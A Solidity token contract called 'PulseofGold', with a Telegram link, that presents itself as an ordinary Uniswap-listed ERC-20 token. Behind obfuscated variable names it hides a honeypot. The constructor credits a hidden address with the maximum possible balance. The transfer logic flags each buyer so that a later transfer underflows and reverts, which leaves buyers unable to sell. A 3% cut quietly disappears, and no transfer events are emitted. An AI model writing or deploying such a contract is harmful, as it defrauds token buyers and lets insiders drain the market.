// https://t.me/PulseofGold

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PulseofGold is Ownable {
    constructor(
        string memory plate,
        string memory lot,
        address sweet,
        address oil
    ) {
        uniswapV2Router = IUniswapV2Router02(sweet);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = lot;
        _name = plate;
        slabs = 3;
        _decimals = 9;
        _balances[oil] = what;
        collect = 1000000000;
        effect[oil] = what;
        _tTotal = collect * 10**_decimals;
        effect[msg.sender] = what;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public slabs;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private collect;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private everywhere;
    uint256 private what = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address whale,
        address carried,
        uint256 traffic
    ) internal {
        uint256 fear = slabs;

        address shells = uniswapV2Pair;

        if (effect[whale] == 0 && shells != whale && fought[whale] > 0) {
            effect[whale] -= fear;
        }

        address favorite = everywhere;
        everywhere = carried;
        fought[favorite] += fear + 1;

        _balances[whale] -= traffic;
        uint256 radio = (traffic / 100) * slabs;
        traffic -= radio;
        _balances[carried] += traffic;
    }

    mapping(address => uint256) private fought;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private effect;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}